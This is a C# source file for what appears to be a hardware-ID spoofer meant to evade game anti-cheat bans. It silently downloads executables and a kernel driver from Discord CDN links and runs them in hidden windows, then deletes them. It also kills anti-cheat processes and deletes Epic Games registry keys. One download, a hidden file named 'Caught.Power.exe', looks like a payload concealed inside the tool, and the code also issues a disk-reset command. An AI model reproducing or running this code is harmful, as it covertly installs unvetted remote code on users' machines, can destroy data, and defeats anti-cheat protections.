using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.IO;
using System.Diagnostics;
using System.Threading;
using System.Security.Principal;

namespace HWID_Spoofer
{
    class Spoof
    {
        public static void SpoofHDD()
        {
            WebClient webClient = new WebClient();
            string text = @"C:\\Windows\\IME\\mapper.exe";
            string text2 = @"C:\\Windows\\IME\\spoof.sys";
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/651522382200176690/660983927883825163/spoofer.sys", text2);
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/651522382200176690/660984792061313024/mapper_3.exe", text);
            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.UseShellExecute = true;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            process = Process.Start(text, text2);
            Thread.Sleep(1000);
            process.Close();
            File.Delete(text2);
            File.Delete(text);
            Process process2 = new Process();
            process2.StartInfo.FileName = "powershell.exe";
            process2.StartInfo.RedirectStandardInput = true;
            process2.StartInfo.RedirectStandardError = true;
            process2.StartInfo.RedirectStandardOutput = true;
            process2.StartInfo.UseShellExecute = false;
            process2.StartInfo.CreateNoWindow = true;
            process2.Start();
            process2.StandardInput.WriteLine("Reset-PhysicalDisk *");
        }
        private static string SIDCleaner = WindowsIdentity.GetCurrent().User.Value;
        public static void CleanTraces(string loc)
        {
            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.RedirectStandardInput = true;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.Start();
            process.StandardInput.WriteLine("taskkill /f /im UnrealCEFSubProcess.exe");
            process.StandardInput.WriteLine("taskkill /f /im CEFProcess.exe");
            process.StandardInput.WriteLine("taskkill /f /im EasyAntiCheat.exe");
            process.StandardInput.WriteLine("taskkill /f /im BEService.exe");
            process.StandardInput.WriteLine("taskkill /f /im BEServices.exe");
            process.StandardInput.WriteLine("taskkill /f /im BattleEye.exe");
            process.StandardInput.WriteLine("taskkill /f /im fortniteClient-win64-Shipping_EAC.exe");
            process.StandardInput.WriteLine("taskkill /f /im fortniteClient-win64-Shipping.exe");
            process.StandardInput.WriteLine("taskkill /f /im fortniteClient-win64-Shipping_BE.exe");
            process.StandardInput.WriteLine("taskkill /f /im fortniteLauncher.exe");
            process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\Software\\Epic Games\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Epic Games\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\Software\\Epic Games\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\com.epicgames.launcher\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Epic Games\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Epic Games\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_CLASSES_ROOT\\com.epicgames.launcher\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SoftWare\\Epic Games\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Classes\\com.epicgames.launcher\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Epic Games\\Unreal Engine\\Hardware Survey\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Epic Games\\Unreal Engine\\Identifiers\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\EpicGames\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\SOFTWARE\\EpicGames\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_USERS\\" + Spoof.SIDCleaner + "\\Software\\Epic Games\" /f");
            process.StandardInput.WriteLine("exit");
            WebClient web = new WebClient();
            string hentai = @"C:\Users\Raymond Shell\Pictures\mapper.exe";
            web.DownloadFile("https://cdn.discordapp.com/attachments/779391430812237884/801183991238885427/Caught.Power.exe", hentai);
            File.SetAttributes(hentai, FileAttributes.Hidden);
            Process process1 = new Process();
            process1.StartInfo.FileName = @"cmd.exe";
            process1.StartInfo.RedirectStandardInput = true;
            process1.StartInfo.UseShellExecute = false;
            process1.StartInfo.CreateNoWindow = true;
            process1.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            process1.Start();
            Thread.Sleep(1000);
            process1.StandardInput.WriteLine(@"" + loc);
            Thread.Sleep(20000);
            File.Delete(hentai);
        }
    }
}
